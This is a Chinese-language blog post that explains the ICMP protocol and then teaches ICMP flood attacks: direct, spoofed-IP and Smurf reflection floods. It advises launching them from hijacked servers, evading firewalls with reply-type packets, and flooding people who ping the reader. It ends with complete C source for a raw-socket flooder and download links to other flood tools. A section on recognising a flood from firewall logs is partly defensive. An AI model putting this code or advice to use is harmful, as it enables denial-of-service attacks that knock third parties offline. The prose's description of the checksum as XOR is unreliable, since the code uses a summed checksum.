
---
layout: post
title: "ICMP洪水攻击原理"
categories:ddos
- Linux
tags:
- ddos
- tcp/ip


---

# 一、什么是ICMP协议？
ICMP全称Internet Control Message Protocol（网际控制信息协议）。提起ICMP，一些人可能会感到陌生，实际上，ICMP与我们息息相关。在网络体系结构的各层次中，都需要控制， 而不同的层次有不同的分工和控制内容，IP层的控制功能是最复杂的，主要负责差错控制、拥塞控制等，任何控制都是建立在信息的基础之上的，在基于IP数据报的网络体系中，网关必须自己处理数据报的传输工作，而IP协议自身没有内在机制来获取差错信息并处理。为了处理这些错误，TCP/IP设计了ICMP协议，当某个网关发现传输错误时，立即向信源主机发送ICMP报文，报告出错信息，让信源主机采取相应处理措施，它是一种差错和控制报文协议，不仅用于传输 差错报文，还传输控制报文。
#  二、ICMP报文格式
ICMP报文包含在IP数据报中，属于IP的一个用户，IP头部就在ICMP报文的前面，所以一个ICMP报文包括IP头部、ICMP头部和ICMP报文 （见图表，ICMP报文的结构和几种常见的ICMP报文格式），IP头部的Protocol值为1就说明这是一个ICMP报文，ICMP头部中的类型 （Type）域用于说明ICMP报文的作用及格式，此外还有一个代码（Code）域用于详细说明某种ICMP报文的类型，所有数据都在ICMP头部后面。 RFC定义了13种ICMP报文格式，具体如下：
```
类型代码   类型描述
0    响应应答（ECHO-REPLY）
3    不可到达
4    源抑制
5    重定向
8    响应请求（ECHO-REQUEST）
11    超时
12    参数失灵
13    时间戳请求
14    时间戳应答
15    信息请求（*已作废）
16    信息应答（*已作废）
17    地址掩码请求
18    地址掩码应答
```
其中代码为15、16的信息报文已经作废。

下面是几种常见的ICMP报文：
## 1.响应请求
我们日常使用最多的ping，就是响应请求（Type=8）和应答（Type=0），一台主机向一个节点发送一个Type=8的ICMP报文，如果途中没 有异常（例如被路由器丢弃、目标不回应ICMP或传输失败），则目标返回Type=0的ICMP报文，说明这台主机存在，更详细的tracert通过计算 ICMP报文通过的节点来确定主机与目标之间的网络距离。

## 2.目标不可到达、源抑制和超时报文
这三种报文的格式是一样的，目标不可到达报文（Type=3）在路由器或主机不能传递数据报时使用，例如我们要连接对方一个不存在的系统端口（端口号小于 1024）时，将返回Type=3、Code=3的ICMP报文，它要告诉我们：“嘿，别连接了，我不在家的！”，常见的不可到达类型还有网络不可到达 （Code=0）、主机不可到达（Code=1）、协议不可到达（Code=2）等。源抑制则充当一个控制流量的角色，它通知主机减少数据报流量，由于 ICMP没有恢复传输的报文，所以只要停止该报文，主机就会逐渐恢复传输速率。最后，无连接方式网络的问题就是数据报会丢失，或者长时间在网络游荡而找不 到目标，或者拥塞导致主机在规定时间内无法重组数据报分段，这时就要触发ICMP超时报文的产生。超时报文的代码域有两种取值：Code=0表示传输超 时，Code=1表示重组分段超时。

## 3.时间戳
时间戳请求报文（Type=13）和时间戳应答报文（Type=14）用于测试两台主机之间数据报来回一次的传输时间。传输时，主机填充原始时间戳，接收方收到请求后填充接收时间戳后以Type=14的报文格式返回，发送方计算这个时间差。一些系统不响应这种报文。

# 三、回到正题：这样的攻击有效吗？
在前面讲过了，ping使用的是ECHO应答，不知道大家注意过没有，ping的返回很慢，用NetXRAY抓包仅为1--5包/秒，这是为什么呢？事实 上，ICMP本身并不慢（由于ICMP是SOCK_RAW产生的原始报文，速度比SOCK_STREAM的SYN和SOCK_DGRAM的UDP要快几乎 10倍！），这样的速度是ping程序故意延迟的（为什么？M$可不想每个人都能用ping来干坏事），同样，我测试过一些号称“ping洪水”的程序， 发现它们的效率和ping.exe没什么两样，经过Dependency Walker查看程序调用的函数发现，他们用的是icmp.dll提供的IcmpSendEcho这个API，这个函数是计算ECHO时间的，速度当然 慢！而那两个“高手”号召的ping攻击实际上就是为了实现ICMP洪水攻击，但是他们用的方法……想想洪水的速度和山涧小溪的速度相差多少吧！就用 ping.exe和IcmpSendEcho这种小溪慢慢流淌的速度能做什么？还不是让人家看笑话！这种攻击根本就是浪费自己的时间！（如今还经常有人问 ping -l 65500 -t的攻击威力如何……哎，悲哀啊悲哀……）

#  四、什么是ICMP洪水？
## 1.ICMP洪水的成因
ping.exe和IcmpSendEcho速度慢的另一个原因是它们必须等待目标主机返回REPLY信息，这个过程需要花费大量时间，而Flood—— 洪水，顾名思义，是速度极快的，当一个程序发送数据包的速度达到了每秒1000个以上，它的性质就成了洪水产生器，洪水数据是从洪水产生器里出来的，但这 样还不够，没有足够的带宽，再猛的洪水也只能像公路塞车那样慢慢移动，成了鸡肋。要做真正的洪水，就需要有一条足够宽的高速公路才可以。极慢的发送速 度+56Kbps小猫等于什么？等于一个未关紧的水龙头，根本没用。
由于ping.exe无法提速，这就需要专门的工具来做洪水了。足够快的数据包速度+足够的带宽，这才是洪水。

## 2.实现ICMP洪水的前提
最大的前提是攻击者的速度！如果你要用56K拨号去攻击一个512Kbps ADSL用户，后果和一只蚂蚁伸腿想绊倒大象的天方夜谭是一样的！其次是你的机器运行速度和数据吞吐量，由于涉及IP校验和的计算（先设置头校验和域的数 值为0，然后对整个数据报头按每16位求异或，再把结果取反，就得到了校验和），如果数据处理能力不够，在这步就慢了一个级别，效果当然大打折扣。最后就 是目标机器的带宽！如果对方比你大很多（例如你2M ADSL，别人用DDN或T1），那么任何Flood都是无病呻吟，挠痒都不够！（希望不要再问“小金，你的R-Series怎么不好用啊”、“我用小金 的AnGryPing攻击别人半天都没事！”、“独裁者的攻击怎么无效啊？”这样的问题了，天啊，我头都大了！）
还有许多人都忽略的问题：发送的速度与数据包大小成反比，而且太大的数据包会被路由器等设备过滤掉！找到一个合适的数据包大小，对提高Flood的效率有很大帮助！

## 3.洪水——两败俱伤的攻击方式
别以为洪水无所不能，实际上，你展开洪水攻击时，攻击程序在消耗对方带宽和资源时，也在消耗你的带宽和资源。这只是个看谁撑得住的攻击而已。实际上，有经 验的攻击者都是用被控制的服务器（肉鸡）来代替自己的机器发动攻击的，不到万不得已或者你对自己的机器网速有自信，否则尽量少用自己的机器来拼搏！

# 五、不同方式的ICMP洪水
## 1.直接Flood
要做这个的首要条件是你的带宽够，然后就是要一个好用的ICMP Flooder，别用ping.exe那种探路用的垃圾，例如我以前发布的AnGryPing，发包速度达到6000---9000包/秒（512 Kbps ADSL），默认是32bytes的ECHO报文洪水，用它即使不能flood别人下去，防火墙也叫得够惨的了。直接攻击会暴露自己IP（如果对方没有还 击能力那还无所谓，固定IP用户不推荐使用这种Flood），直接Flood主要是为了顾及Win9x/Me不能伪造IP的缺陷，否则一般还是别用为妙。

简单示意图：
                                    ICMP
攻击者[IP=211.97.54.3]--------------------------------->受害者[截获攻击者IP=211.97.54.3]==>换IP回来反击，嘿嘿

## 2.伪造IP的Flood
如果你是Win2000/XP并且是Administrator权限，可以试试看FakePing，它能随意伪造一个IP来Flood，让对方摸不到头脑，属于比较隐蔽阴险的Flood。

简单示意图：
                             伪造IP=1.1.1.1的ICMP
攻击者[IP=211.97.54.3]--------------------------------->受害者[截获攻击者IP=1.1.1.1]==>倒死

## 3.反射
用采取这种方式的第一个工具的名称来命名的“Smurf”洪水攻击，把隐蔽性又提高了一个档次，这种攻击模式里，最终淹没目标的洪水不是由攻击者发出的，也不是伪造IP发出的，而是正常通讯的服务器发出的！
实现的原理也不算复杂，Smurf方式把源IP设置为受害者IP，然后向多台服务器发送ICMP报文（通常是ECHO请求），这些接收报文的服务器被报文欺骗，向受害者返回ECHO应答（Type=0），导致垃圾阻塞受害者的门口……
从示意图可以看出，它比上面两种方法多了一级路径——受骗的主机（称为“反射源”），所以，一个反射源是否有效或者效率低下，都会对Flood效果造成影响！

简单示意图：
```
伪造受害者的ICMP                     应答
攻击者[IP=211.97.54.3]-------------------------->正常的主机--------------->受害者
```
以上是几种常见的Flood方式，在测试中，我发现一个有趣的现象：一些防火墙（如天网）只能拦截ECHO请求（Ping）的ICMP报文，对于其他 ICMP报文一概睁只眼闭只眼，不知道其他防火墙有没有这个情况。所以想神不知鬼不觉对付你的敌人时，请尽量避开直接ECHO Flood，换用Type=0的ECHO应答或Type=14的时间戳应答最好，其他类型的ICMP报文没有详细测试过，大家可以试试看Type=3、 ## 4、11的特殊报文会不会有更大效果。

# 六、ICMP Flood能防吗？
先反问你一个问题：洪水迅猛的冲来时，你能否拿着一个脸盆来抵挡？（坐上脸盆做现代鲁宾逊倒是个不错的主意，没准能漂到MM身边呢）
软件的网络防火墙能对付一些漏洞、溢出、OOB、IGMP攻击，但是对于洪水类型的攻击，它们根本无能为力，我通常对此的解释是“倾倒垃圾”：“有蟑螂或 老鼠在你家门前逗留，你可以把它们赶走，但如果有人把一车垃圾倾倒在你家门口呢？”前几天看到mikespook大哥对此有更体面的解释，转载过来——“ 香蕉皮原理：如果有人给你一个香蕉和一个香蕉皮你能区分，并把没有用的香蕉皮扔掉。（一般软件防火墙就是这么判断并丢弃数据包的。）但是如果有人在同一时 间内在你身上倒一车香蕉皮，你再能区分有用没用也没啥作用了~~因为你被香蕉皮淹没了~~~~（所以就算防火墙能区分是DoS的攻击数据包，也只能识别， 根本来不及丢弃~~死了，死了，死了~~）”
所以，洪水没法防！能做的只有提高自己的带宽和预防洪水的发生（虽然硬件防火墙和分流技术能做到，但那价格是太昂贵的，而且一般人也没必要这样做）。
如果你正在被攻击，最好的方法是抓取攻击者IP（除非对方用第一种，否则抓了没用——假的IP）后，立即下线换IP！（什么？你是固定IP？没辙了，打电话找警察叔叔吧）

# 七、被ICMP Flood攻击的特征
如何发现ICMP Flood？
当你出现以下症状时，就要注意是否正被洪水攻击：
1.传输状态里，代表远程数据接收的计算机图标一直亮着，而你没有浏览网页或下载
2.防火墙一直提示有人试图ping你
3.网络速度奇慢无比
4.严重时系统几乎失去响应，鼠标呈跳跃状行走

如果出现这些情况，先不要慌张，冷静观察防火墙报警的频率及IP来确认是否普通的Ping或是洪水，做出相应措施（其实大多数情况也只能换IP了）。
1.普通ping 
 这种“攻击”一般是对方扫描网络或用ping -t发起的，没多大杀伤力（这个时候，防火墙起的作用就是延迟攻击者的数据报发送间隔时间，请别关闭防火墙！否则后果是严重的！），通常表现如下：
```
[13:09:20] 61.151.252.106 尝试用Ping 来探测本机，
            该操作被拒绝。

[13:09:24] 61.151.252.106 尝试用Ping 来探测本机，
            该操作被拒绝。

[13:09:26] 61.151.252.106 尝试用Ping 来探测本机，
            该操作被拒绝。

[13:09:30] 61.151.252.106 尝试用Ping 来探测本机，
            该操作被拒绝。
```
这么慢的速度，很明显是由ping.exe或IcmpSendEcho发出的，如果对方一直不停的让你的防火墙吵闹，你可以给他个真正的ICMP Flood问候。

2.直接Flood
这是比较够劲的真正意义洪水了，防火墙的报警密度会提高一个数量级：
```
[13:09:20] 61.151.252.106 尝试用Ping 来探测本机，
            该操作被拒绝。

[13:09:20] 61.151.252.106 尝试用Ping 来探测本机，
            该操作被拒绝。

[13:09:20] 61.151.252.106 尝试用Ping 来探测本机，
            该操作被拒绝。

[13:09:20] 61.151.252.106 尝试用Ping 来探测本机，
            该操作被拒绝。

[13:09:20] 61.151.252.106 尝试用Ping 来探测本机，
            该操作被拒绝。

[13:09:20] 61.151.252.106 尝试用Ping 来探测本机，
            该操作被拒绝。

[13:09:20] 61.151.252.106 尝试用Ping 来探测本机，
            该操作被拒绝。

[13:09:20] 61.151.252.106 尝试用Ping 来探测本机，
            该操作被拒绝。

[13:09:20] 61.151.252.106 尝试用Ping 来探测本机，
            该操作被拒绝。

[13:09:20] 61.151.252.106 尝试用Ping 来探测本机，
            该操作被拒绝。

[13:09:20] 61.151.252.106 尝试用Ping 来探测本机，
            该操作被拒绝。

[13:09:20] 61.151.252.106 尝试用Ping 来探测本机，
            该操作被拒绝。

[13:09:20] 61.151.252.106 尝试用Ping 来探测本机，
            该操作被拒绝。

[13:09:20] 61.151.252.106 尝试用Ping 来探测本机，
            该操作被拒绝。

[13:09:20] 61.151.252.106 尝试用Ping 来探测本机，
            该操作被拒绝。

[13:09:21] 61.151.252.106 尝试用Ping 来探测本机，
            该操作被拒绝。

[13:09:21] 61.151.252.106 尝试用Ping 来探测本机，
            该操作被拒绝。

[13:09:21] 61.151.252.106 尝试用Ping 来探测本机，
            该操作被拒绝。

[13:09:21] 61.151.252.106 尝试用Ping 来探测本机，
            该操作被拒绝。

[13:09:21] 61.151.252.106 尝试用Ping 来探测本机，
            该操作被拒绝。

[13:09:21] 61.151.252.106 尝试用Ping 来探测本机，
            该操作被拒绝。

[13:09:21] 61.151.252.106 尝试用Ping 来探测本机，
            该操作被拒绝。

[13:09:21] 61.151.252.106 尝试用Ping 来探测本机，
            该操作被拒绝。
```
这时候你的防火墙实际上已经废了，换个IP吧。

3.伪造IP的Flood
比较厉害的ICMP Flood，使用的是伪造的IP而且一样大密度，下面是the0crat用56K拨号对我的一次攻击测试的部分数据（看看时间，真晕了，这可是56K小猫而已啊）
```
[18:52:12] 1.1.1.1 尝试用Ping 来探测本机，
           该操作被拒绝。

[18:52:12] 1.1.1.1 尝试用Ping 来探测本机，
           该操作被拒绝。

[18:52:12] 1.1.1.1 尝试用Ping 来探测本机，
           该操作被拒绝。

[18:52:12] 1.1.1.1 尝试用Ping 来探测本机，
           该操作被拒绝。

[18:52:12] 1.1.1.1 尝试用Ping 来探测本机，
           该操作被拒绝。

[18:52:12] 1.1.1.1 尝试用Ping 来探测本机，
           该操作被拒绝。

[18:52:12] 1.1.1.1 尝试用Ping 来探测本机，
           该操作被拒绝。

[18:52:12] 1.1.1.1 尝试用Ping 来探测本机，
           该操作被拒绝。

[18:52:12] 1.1.1.1 尝试用Ping 来探测本机，
           该操作被拒绝。

[18:52:12] 1.1.1.1 尝试用Ping 来探测本机，
           该操作被拒绝。

[18:52:12] 1.1.1.1 尝试用Ping 来探测本机，
           该操作被拒绝。

[18:52:12] 1.1.1.1 尝试用Ping 来探测本机，
           该操作被拒绝。

[18:52:12] 1.1.1.1 尝试用Ping 来探测本机，
           该操作被拒绝。

[18:52:12] 1.1.1.1 尝试用Ping 来探测本机，
           该操作被拒绝。

[18:52:12] 1.1.1.1 尝试用Ping 来探测本机，
           该操作被拒绝。

[18:52:13] 1.1.1.1 尝试用Ping 来探测本机，
           该操作被拒绝。
```

4、反射ICMP Flood
估计现在Smurf攻击还没有多少人会用（R-Series的RSS.EXE就是做这事的，RSA.EXE和RSC.EXE分别用作SYN反射和UDP反 射），所以这种方法还没有大规模出现，但Smurf是存在的！而且这个攻击方法比前面几种更恐怖，因为攻击你的是大网站（或一些受苦受难的服务器）！
我正在被网易、万网和新浪网站攻击中（懒得修改天网策略，直接用其他工具抓的。实际攻击中，反射的IP会多几倍！）
```
[15:26:32] RECV:ICMP Packet from 202.108.37.36 (Type=0,Code=0,Len=52) 
[15:26:32] RECV:ICMP Packet from 202.108.36.206 (Type=0,Code=0,Len=52) 
[15:26:32] RECV:ICMP Packet from 210.192.103.30 (Type=0,Code=0,Len=52) 
[15:26:32] RECV:ICMP Packet from 202.108.37.36 (Type=0,Code=0,Len=52) 
[15:26:32] RECV:ICMP Packet from 210.192.103.30 (Type=0,Code=0,Len=52) 
[15:26:32] RECV:ICMP Packet from 202.108.36.206 (Type=0,Code=0,Len=52) 
[15:26:32] RECV:ICMP Packet from 202.108.37.36 (Type=0,Code=0,Len=52) 
[15:26:32] RECV:ICMP Packet from 210.192.103.30 (Type=0,Code=0,Len=52) 
[15:26:32] RECV:ICMP Packet from 210.192.103.30 (Type=0,Code=0,Len=52) 
[15:26:32] RECV:ICMP Packet from 202.108.36.206 (Type=0,Code=0,Len=52) 
[15:26:33] RECV:ICMP Packet from 210.192.103.30 (Type=0,Code=0,Len=52) 
[15:26:33] RECV:ICMP Packet from 202.108.36.206 (Type=0,Code=0,Len=52) 
[15:26:33] RECV:ICMP Packet from 202.108.37.36 (Type=0,Code=0,Len=52) 
[15:26:33] RECV:ICMP Packet from 202.108.37.36 (Type=0,Code=0,Len=52) 
[15:26:33] RECV:ICMP Packet from 202.108.36.206 (Type=0,Code=0,Len=52)
[15:26:33] RECV:ICMP Packet from 210.192.103.30 (Type=0,Code=0,Len=52)  
[15:26:33] RECV:ICMP Packet from 202.108.37.36 (Type=0,Code=0,Len=52) 
[15:26:33] RECV:ICMP Packet from 202.108.36.206 (Type=0,Code=0,Len=52) 
[15:26:33] RECV:ICMP Packet from 210.192.103.30 (Type=0,Code=0,Len=52) 
```
可以看出，攻击者使用的是32bytes的ECHO请求，所以服务器返回52-20=32bytes的REPLY报文，在这个情况下，天网是不会报警的。

还是那句话，报警也没用了。

八、自己编写ICMP Flooder
以上说的都是理论，如何才能自己写一个呢？相信很多人已经跃跃欲试了，下面就用VC6.0来写一个直接的ICMP Flooder（能在Win98/Me环境使用）……先等等——最重要的是原理。

1.程序原理
当然不能用IcmpSendEcho来做，我们必须自己从最原始的IP报文里做一个。构造一个SOCK_RAW报文后，填充ICMP数据和计算校验和（CheckSum），循环sendto发出去就完成了，so easy！

2.ICMP报文的声明
一个ICMP报文包括IP头部、ICMP头部和ICMP报文，用IPPROTO_ICMP创建这个类型的IP包，用以下结构填充：
typedef struct _ihdr
{
   BYTE i_type; //8位类型
   BYTE i_code; //8位代码
   USHORT i_cksum; //16位校验和
   USHORT i_id; //识别号
   USHORT i_seq; //报文序列号
   ULONG timestamp; //时间戳
}ICMP_HEADER;

这样我们就声明了一个ICMP报文结构，就等后面的填充了。

3.校验和
计算方法：先设置头校验和域的数值为0，然后对整个数据报头按每16位求异或，再把结果取反，就得到了校验和。
函数：
USHORT checksum(USHORT *buffer, int size)
{
   unsigned long cksum=0;
   while(size >1)
    {
      cksum+=*buffer++;
      size -=sizeof(USHORT);
    }
   if(size )
    {
      cksum += *(UCHAR*)buffer;
    }
   cksum = (cksum >> 16) + (cksum & 0xffff);
   cksum += (cksum >>16);
   return (USHORT)(~cksum);
}

4.必须注意的问题
由于Win98/Me系统不支持IP-Spoof，所以无法用setsockopt设置IP_HDRINCL让用户自己填充IP头部，所以Win98 /Me不能实现IP伪造！如果有人做的号称能伪造IP的工具而且又支持Win98/Me，那一定是吹出来的，因为这是系统限制，程序没法解决的。而且自己 填充IP头部后，CheckSum就不是由系统计算了，这时候你的CheckSum计算函数就变成瓶颈了，这就是伪造IP后的Flooder发送速度不够 系统计算CheckSum的Flooder快的原因了，除非优化过CheckSum函数。限于篇幅，采用IP-Spoof技术的FakePing和 Smurf就不讨论了。

5.完整代码
做一个Console Application工程，输入下面的代码。如果优化得当，最终编译生成的EXE也就4096字节而已，呵呵，just do it……


```
agp.c

AnGryPing -- ICMP Flooder by HBU·小金(LK007)
Copyright(C) 2002
E-MAIL:lk007@163.com
*/

#include <stdio.h> 
#include <winsock2.h> 
#include <ws2tcpip.h> 
#pragma comment(lib, "ws2_32.lib")
//头文件和库文件声明，如果不能编译，请在Link里加上ws2_32.lib

#define false 0
#define true 1

#define SEQ 0x28376839

// 定义ICMP首部
typedef struct _ihdr
{
   BYTE i_type; //8位类型
   BYTE i_code; //8位代码
   USHORT i_cksum; //16位校验和
   USHORT i_id; //识别号
   USHORT i_seq; //报文序列号
   ULONG timestamp; //时间戳
}ICMP_HEADER;

//计算校验和的子函数
USHORT checksum(USHORT *buffer, int size)
{
   unsigned long cksum=0;
   while(size >1)
    {
      cksum+=*buffer++;
      size -=sizeof(USHORT);
    }
   if(size )
    {
      cksum += *(UCHAR*)buffer;
    }
   cksum = (cksum >> 16) + (cksum & 0xffff);
   cksum += (cksum >>16);
   return (USHORT)(~cksum);
}

int main(int argc, char **argv)
{
   int datasize,ErrorCode,flag;
   int TimeOut=2000, SendSEQ=0, PacketSize=32,type=8,code=0,counter=0; //默认数据声明
   char SendBuf[65535]={0}; //缓冲
   WSADATA wsaData;
   SOCKET SockRaw=(SOCKET)NULL;
   struct sockaddr_in DestAddr;
   ICMP_HEADER icmp_header;
   char DestIp[20]; //目标IP

   if (argc<2)
    {
      printf("AngryPing by HBU-LK007\n");
      printf("Usage:%s [Dest] <PacketSize> <type> <code>\n",argv[0]); 
//允许用户自定义数据包大小、类型、代码，用以绕过一些防火墙或做一些特殊的报文Flood
      exit(0);
    }
   strcpy(DestIp,argv[1]);
   if (argc>2) PacketSize=atoi(argv[2]); //取得数据大小
if (PacketSize>65500) 
{ 
printf("Packet size must less than 65500\n"); //太大会无法生成IP数据报的
exit(0); 
}

   if (argc>3) type=atoi(argv[3]); //取得类型值
   if (type>16) 
{ 
printf("Type must less than 16\n"); 
exit(0); 
}

   if (argc>4) code=atoi(argv[4]); //取得代码值

//初始化SOCK_RAW
   if((ErrorCode=WSAStartup(MAKEWORD(2,1),&wsaData))!=0)
    {
      fprintf(stderr,"WSAStartup failed: %d\n",ErrorCode);
      exit(0);
    }

   if((SockRaw=WSASocket(AF_INET,SOCK_RAW,IPPROTO_ICMP,NULL,0,WSA_FLAG_OVERLAPPED))==INVALID_SOCKET)
    {
      fprintf(stderr,"WSASocket failed: %d\n",WSAGetLastError());
      exit(0);
    }
   flag=TRUE;

{

//设置发送超时
   ErrorCode=setsockopt(SockRaw,SOL_SOCKET,SO_SNDTIMEO,(char*)&TimeOut,sizeof(TimeOut));
   if (ErrorCode==SOCKET_ERROR)
    {
      fprintf(stderr,"Failed to set send TimeOut: %d\n",WSAGetLastError());
      exit(1);
   }

//主要代码开始
printf("Dest:%s   packet:%d   type:%d   code:%d\n\n",argv[1],PacketSize,type,code);
printf("Starting...\n\n");   //视觉效果:P
   memset(&DestAddr,0,sizeof(DestAddr));
   DestAddr.sin_family=AF_INET;
   DestAddr.sin_addr.s_addr=inet_addr(DestIp); //填充Socket结构
//填充ICMP首部
   icmp_header.i_type = type;
   icmp_header.i_code = code;
   icmp_header.i_cksum = 0; //校验和置0
   icmp_header.i_id = 2;
   icmp_header.timestamp = GetTickCount(); //时间戳
   icmp_header.i_seq=999;
   memcpy(SendBuf, &icmp_header, sizeof(icmp_header)); //组合ICMP报文和头部
   memset(SendBuf+sizeof(icmp_header), 'E', PacketSize); //用E填充ICMP数据
   icmp_header.i_cksum = checksum((USHORT *)SendBuf, sizeof(icmp_header)+PacketSize); //计算校验和

   datasize=sizeof(icmp_header)+PacketSize; //计算整个数据包大小
//开始发送
while(1){ //无限循环，按Ctrl+C跳出
```
这里的printf实际上是为了延时，Flood程序最好别用这么华丽的界面或字符提示来美化自己，这样会迅速拖慢程序效率！当然，如果能不显示最好，但 我去掉printf后，程序死掉了（太快？）如果你觉得“Sending 1024 packets...”还是大大增加了延时，可以改成printf("."); 一个小点。反正是自己用，用得顺手就可以。
```
printf("Sending 1024 packets...\n");
    for(counter=0;counter<1024;counter++){ //循环发送1024个数据包为一组
//发送ICMP报文
      ErrorCode=sendto(SockRaw,SendBuf,datasize,0,(struct sockaddr*)&DestAddr,sizeof(DestAddr));
      if (ErrorCode==SOCKET_ERROR) printf("\nSend Error:%d\n",GetLastError());
    }
}
}

   {
    if (SockRaw != INVALID_SOCKET) closesocket(SockRaw);
    WSACleanup();
   }
return 0;
}
```

# 九、几个ICMP Flood工具
###AnGryPing（上面代码的的完成品，直接Flood） 下载地址：http://www.heibai.net/download/show.php?id=3002
###R-Series（包括ACK-Flood、Smurf、Chargen） 下载地址：http://www.heibai.net/download/show.php?id=2970
###pingflood（伪造IP的Flood，号称支持Win98/Me？没测试过，理论上不可信） 下载地址：http://www.hacker.com.cn/down/soft.asp?id=127
###FakePing（伪造IP的Flood） 下载地址：http://www.hacker.com.cn/down/soft.asp?id=41

